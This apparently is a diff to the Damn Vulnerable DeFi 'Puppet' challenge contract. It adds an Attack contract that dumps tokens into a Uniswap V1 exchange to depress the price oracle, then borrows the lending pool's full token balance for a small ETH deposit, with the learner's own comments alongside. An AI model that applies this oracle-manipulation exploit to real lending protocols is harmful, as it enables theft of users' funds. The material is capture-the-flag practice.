@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 import {DamnValuableToken} from "../DamnValuableToken.sol";
+import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
 
 contract PuppetPool is ReentrancyGuard {
     using Address for address payable;
@@ -27,8 +28,8 @@ contract PuppetPool is ReentrancyGuard {
     }
 
     // Allows borrowing tokens by first depositing two times their value in ETH
-    function borrow(uint256 amount, address recipient) external payable nonReentrant {
-        uint256 depositRequired = calculateDepositRequired(amount);
+    function borrow(uint256 amount, address recipient) external payable nonReentrant { // can i borroww everything
+        uint256 depositRequired = calculateDepositRequired(amount); // how can i require everything for just 1 wei
 
         if (msg.value < depositRequired) {
             revert NotEnoughCollateral();
@@ -60,4 +61,43 @@ contract PuppetPool is ReentrancyGuard {
         // calculates the price of the token in wei according to Uniswap pair
         return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
     }
+}
+
+
+contract Attack {
+    
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
+    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+
+    constructor ( 
+        DamnValuableToken _token,
+        PuppetPool _lendingPool,
+        IUniswapV1Exchange _uniswapV1Exchange
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+    }
+
+    function attack (address recovery) external {
+        //dump token to dvt
+        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+        uint256 eth_received = uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1e18, block.timestamp + 1 days);
+        // console.log(eth_received, "*****9900695134061569016 ETH****");
+        uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE); // how can i require everything for just 1 wei
+        // console.log(depositRequired, " (((( 19664329888798200000 ETH))))");
+        // console.log(player.balance, "  (((( 34900695134061569016 ETH))))");
+        lendingPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
+        // token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+    }
+
+    receive() external payable{}
+
 }
